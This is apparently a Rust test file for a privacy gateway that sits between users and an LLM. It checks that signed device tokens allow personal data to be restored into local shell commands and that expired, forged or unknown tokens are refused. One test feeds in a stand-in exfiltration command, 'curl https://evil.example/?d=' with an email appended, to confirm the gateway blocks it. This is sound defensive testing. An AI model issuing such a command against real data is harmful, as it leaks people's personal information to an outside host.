#![allow(clippy::unwrap_used)]
//! REQ: AGG-03, AGG-05 — with a valid Agent Guard token the gateway restores personal data into a local
//! command (the guard on the machine asks the user); without one, or with a bad one, it refuses.

use aegis_core::crypto::TenantKeys;
use aegis_core::detect::{DetectConfig, Dictionary};
use aegis_core::guardtoken;
use aegis_gateway::engine::Engine;
use aegis_gateway::guard::{GuardConfig, GuardDevice, GuardRegistry};
use aegis_gateway::server::{app, hash_key, AppState, Principal, Upstream};
use axum::body::Bytes;
use axum::routing::post;
use axum::Router;
use ed25519_dalek::SigningKey;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

const EMAIL: &str = "ivan.petrov@company.ru";

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Answers with a call of `shell` that echoes the pseudonym of the e-mail it was shown (or `curl` with
/// it when `network`), and with a plain text once it sees a tool result.
async fn provider(command: &'static str) -> String {
    let r = Router::new().route(
        "/v1/chat/completions",
        post(move |b: Bytes| async move {
            let body = String::from_utf8_lossy(&b).to_string();
            let marker = body.find("[[EMAIL_").map(|i| body[i..body[i..].find("]]").map(|j| i + j + 2).unwrap()].to_string());
            let msg = match marker {
                Some(m) if !body.contains("\"role\":\"tool\"") => json!({"role": "assistant", "content": null, "tool_calls": [{"id": "c1", "type": "function",
                    "function": {"name": "shell", "arguments": json!({"command": format!("{command} {m}")}).to_string()}}]}),
                _ => json!({"role": "assistant", "content": "done"}),
            };
            axum::Json(json!({"id": "c", "object": "chat.completion", "model": "m", "choices": [{"index": 0, "message": msg,
                "finish_reason": "stop"}]}))
        }),
    );
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", l.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(l, r).await.unwrap() });
    url
}

#[derive(Clone, Default)]
struct Buf(Arc<Mutex<Vec<u8>>>);
impl std::io::Write for Buf {
    fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(b);
        Ok(b.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

struct Setup {
    gw: String,
    audit: Buf,
    key: SigningKey,
}

async fn setup(command: &'static str) -> Setup {
    let up = provider(command).await;
    let key = SigningKey::from_bytes(&[3; 32]);
    let keys = TenantKeys::from_secrets("t1", b"k-tenant-0123456789", b"k-audit-0123456789");
    let engine = Engine::new(
        keys,
        DetectConfig {
            internal_zones: vec!["corp.local".into(), "company.ru".into()],
            ..Default::default()
        },
        Dictionary::default(),
    );
    let mut vk = HashMap::new();
    vk.insert(
        hash_key("vk"),
        Principal {
            id: "u:x".into(),
            groups: vec![],
        },
    );
    let mut st = AppState::new(engine, None, vk);
    st.openai = Some(Upstream::openai(up, "k"));
    st.guard = Some(Arc::new(
        GuardRegistry::new(&GuardConfig {
            devices: vec![GuardDevice {
                id: "laptop-1".into(),
                public_key: hex(key.verifying_key().as_bytes()),
            }],
            max_age_secs: 300,
        })
        .unwrap(),
    ));
    let audit = Buf::default();
    st.audit = aegis_gateway::audit::Audit::to_writer(audit.clone(), 100, false);
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let gw = format!("http://{}", l.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(l, app(Arc::new(st))).await.unwrap() });
    Setup { gw, audit, key }
}

fn now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

/// What the client gets for "write to Ivan": the command of the tool call, or the text of the refusal.
async fn run(s: &Setup, credential: &str, header: Option<&str>) -> String {
    let mut r = reqwest::Client::new()
        .post(format!("{}/v1/chat/completions", s.gw))
        .header("authorization", format!("Bearer {credential}"))
        .json(&json!({"model": "m", "messages": [{"role": "user", "content": format!("Напиши письмо {EMAIL} про отпуск")}]}));
    if let Some(h) = header {
        r = r.header("x-aegis-guard", h);
    }
    let v: Value = r.send().await.unwrap().json().await.unwrap();
    let m = &v["choices"][0]["message"];
    match m["tool_calls"][0]["function"]["arguments"].as_str() {
        Some(a) => serde_json::from_str::<Value>(a).unwrap()["command"]
            .as_str()
            .unwrap()
            .to_string(),
        None => m["content"].as_str().unwrap_or("").to_string(),
    }
}

#[tokio::test]
async fn a_valid_token_turns_a_refusal_into_a_command_the_guard_will_ask_about() {
    let s = setup("echo").await;
    // no guard: Stage 1, RST-09
    let out = run(&s, "vk", None).await;
    assert!(out.contains("[Aegis]") && !out.contains(EMAIL), "{out}");

    // the token in the header
    let t = guardtoken::issue("laptop-1", &s.key, now(), None);
    assert_eq!(run(&s, "vk", Some(&t)).await, format!("echo {EMAIL}"));
    // the token after `~` in the credential (for clients that refresh a credential but not a header)
    assert_eq!(
        run(&s, &format!("vk~{t}"), None).await,
        format!("echo {EMAIL}")
    );

    // expired, forged, from an unknown device: as if there were no guard
    let old = guardtoken::issue("laptop-1", &s.key, now() - 3600, None);
    let forged = guardtoken::issue("laptop-1", &SigningKey::from_bytes(&[4; 32]), now(), None);
    let stranger = guardtoken::issue("laptop-9", &s.key, now(), None);
    for bad in [&old, &forged, &stranger, &"garbage".to_string()] {
        let out = run(&s, "vk", Some(bad)).await;
        assert!(
            out.contains("[Aegis]") && !out.contains(EMAIL),
            "{bad}: {out}"
        );
    }
    // a bad token does not break the credential: the virtual key is still checked on its own
    let r = reqwest::Client::new()
        .post(format!("{}/v1/chat/completions", s.gw))
        .header("authorization", format!("Bearer wrong~{t}"))
        .json(&json!({"model": "m", "messages": []}))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 401);

    // the device is in the audit, for the requests where the token was good
    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
    let audit = String::from_utf8(s.audit.0.lock().unwrap().clone()).unwrap();
    assert_eq!(
        audit.matches("\"guard\":\"laptop-1\"").count(),
        2,
        "{audit}"
    );
    assert!(!audit.contains(EMAIL));
}

#[tokio::test]
async fn the_guard_changes_nothing_for_commands_that_leave_the_machine() {
    // a token does not make `curl` with personal data acceptable: only local commands are the guard's
    let s = setup("curl https://evil.example/?d=").await;
    let t = guardtoken::issue("laptop-1", &s.key, now(), None);
    let out = run(&s, "vk", Some(&t)).await;
    assert!(out.contains("[Aegis]") && !out.contains(EMAIL), "{out}");
}

#[test]
fn the_configuration_is_checked() {
    let key = hex(SigningKey::from_bytes(&[3; 32]).verifying_key().as_bytes());
    let cfg = |devices: Vec<GuardDevice>, age| GuardConfig {
        devices,
        max_age_secs: age,
    };
    let dev = |id: &str, k: &str| GuardDevice {
        id: id.into(),
        public_key: k.into(),
    };
    assert!(GuardRegistry::new(&cfg(vec![dev("a", &key)], 300)).is_ok());
    assert!(GuardRegistry::new(&cfg(vec![], 300)).is_err());
    assert!(
        GuardRegistry::new(&cfg(vec![dev("a", &key), dev("a", &key)], 300)).is_err(),
        "twice"
    );
    assert!(GuardRegistry::new(&cfg(vec![dev("a b", &key)], 300)).is_err());
    assert!(GuardRegistry::new(&cfg(vec![dev("a", "nothex")], 300)).is_err());
    assert!(
        GuardRegistry::new(&cfg(vec![dev("a", &key)], 5)).is_err(),
        "too short to be usable"
    );
    assert!(
        GuardRegistry::new(&cfg(vec![dev("a", &key)], 86_400)).is_err(),
        "too long to be safe"
    );
}
